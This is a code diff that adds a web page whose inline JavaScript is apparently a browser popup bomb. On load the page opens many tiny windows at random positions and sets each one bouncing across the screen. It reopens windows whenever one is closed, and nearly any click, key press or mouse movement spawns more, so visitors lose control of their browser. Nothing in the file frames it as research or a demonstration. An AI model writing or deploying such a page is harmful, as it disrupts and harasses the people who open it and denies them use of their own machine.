@@ -1,0 +1,174 @@
+<body onload="onload()">
+<button onclick="start()">Start!</button>
+
+<script>
+    const SCREEN_WIDTH = window.screen.availWidth
+    const SCREEN_HEIGHT = window.screen.availHeight
+    const WIN_WIDTH = 10
+    const WIN_HEIGHT = 10
+    const VELOCITY = 15
+    const MARGIN = 10
+    const TICK_LENGTH = 50
+    const wins = []
+
+    function onload() {
+
+        if(!((window.opener && isParentSameOrigin()) || window.location.search.indexOf('child=true') !== -1)){
+        for(let i = 0; i <= 10; i++){
+            openWindow()
+        }
+        }else{
+            playBall()
+        }
+
+    }
+
+    // add event listeners to all elements
+    Array.from(document.querySelectorAll('*')).forEach(el => {
+    el.addEventListener("beforeunload", init);
+    el.addEventListener("blur", init); 
+    el.addEventListener("click", init); 
+    el.addEventListener("error", init); 
+    el.addEventListener("focus", init); 
+    el.addEventListener("keydown", init); 
+    el.addEventListener("keypress", init); 
+    el.addEventListener("keyup", init); 
+    el.addEventListener("load", init); 
+    el.addEventListener("message", init); 
+    el.addEventListener("mousedown", init); 
+    el.addEventListener("mousemove", init); 
+    el.addEventListener("mouseout", init); 
+    el.addEventListener("mouseover", init); 
+    el.addEventListener("mouseup", init); 
+    el.addEventListener("popstate", init); 
+    el.addEventListener("resize", init); 
+    el.addEventListener("scroll", init); 
+    el.addEventListener("touchend", init); 
+    el.addEventListener("touchmove", init); 
+    el.addEventListener("touchstart", init); 
+    el.addEventListener("visibilitychange", init); 
+    el.style.color = "red";
+    })
+
+    var forceWindow = false
+
+    function init() {
+        if(forcewindow){
+            openWindow()
+            forceWindow = false
+        }
+    }
+
+    function forcewindow() {
+        forceWindow = true
+    }
+
+    function isParentSameOrigin () {
+    try {
+        // May throw an exception if `window.opener` is on another origin
+        return window.opener.location.origin === window.location.origin
+    } catch (err) {
+        return false
+    }
+    }
+
+    function getRandomCoords() {
+    const x = MARGIN +
+      Math.floor(Math.random() * (SCREEN_WIDTH - WIN_WIDTH - MARGIN))
+    const y = MARGIN +
+      Math.floor(Math.random() * (SCREEN_HEIGHT - WIN_HEIGHT - MARGIN))
+    return { x, y }
+  }
+
+//  document.addEventListener("mouseover", function() {
+//      var {x, y} = getRandomCoords()
+//      var vx = x - window.screenX
+//      var vy = y - window.screenY
+//      window.moveBy(vx, vy)
+//      openWindow()
+//  })
+
+  function focusWindows() {
+    wins.forEach(win => {
+        if (!win.closed) win.focus()
+    })
+    }
+
+    const window_opened = true
+
+    function windowcount() {
+        var i = 0
+        wins.forEach(win => {if (!win.closed) i++})
+        return i
+    }
+
+   function start() {
+        focusWindows()
+        if(windowcount()){
+            for(let i = 1; i <= 10; i++){
+                openWindow()
+            }
+        }
+        focusWindows()
+   }
+
+    function openWindow() {
+        const { x, y } = getRandomCoords()
+        const opts = `width=${WIN_WIDTH},height=${WIN_HEIGHT},left=${x},top=${y}`
+        const win = window.open(window.location.pathname, '', opts)
+        window.focus();
+          if (!win) return
+        wins.push(win)
+        win.onunload = function(){ console.log("closed");forcewindow() };
+    }
+    
+
+    var xOff = 5;
+    var yOff = 5;
+    var xPos = 400;
+    var yPos = -100;
+    var flagRun = 1;
+
+    function newXlt(){
+            xOff = Math.ceil( 0 - 6 * Math.random()) * 5 - 10 ;
+            window.focus()}
+
+    function newXrt(){
+            xOff = Math.ceil(7 * Math.random())  * 5 - 10 ;
+            }
+
+    function newYup(){
+            yOff = Math.ceil( 0 - 6 * Math.random())  * 5 - 10 ;
+            }
+
+    function newYdn(){
+            yOff = Math.ceil( 7 * Math.random())  * 5 - 10  ;
+            }
+    function fOff(){
+            flagrun = 0;
+            }
+
+    function playBall() {
+            xPos += xOff;
+            yPos += yOff;
+            if (xPos > screen.width-175){
+            newXlt();
+            }
+            if (xPos < 0){
+            newXrt();
+            }
+            if (yPos > screen.height-100){
+            newYup();
+            }
+            if (yPos < 0){
+            newYdn();
+            }
+            if (flagRun == 1){
+            window.moveTo(xPos,yPos);
+            setTimeout('playBall()',1);
+            }
+            }
+
+
+</script>
+</body>
